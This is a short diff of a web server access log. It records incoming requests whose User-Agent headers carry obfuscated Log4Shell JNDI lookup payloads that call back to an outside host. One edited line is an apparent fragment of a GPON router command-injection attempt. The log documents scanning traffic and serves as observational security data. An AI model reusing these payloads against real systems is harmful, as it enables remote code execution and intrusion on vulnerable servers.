@@ -1137,5 +1137,5 @@ GET /app/custom/assets/favicon/favicon-32x32.png HTTP/1.1" 200 823 "-" "${jndi:$
 GET / HTTP/1.1" 200 733 "-" "${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}" "-"
 GET /favicon.ico HTTP/1.1" 404 524 "-" "${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}" "-"
 GET /app/custom/assets/favicon/favicon.ico HTTP/1.1" 200 7406 "-" "${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}" "-"
-sh+/tmp/gpon80&ipv=0"
+sh+/tmp/gpon80&ipv=0
 GET /asrsp.txt
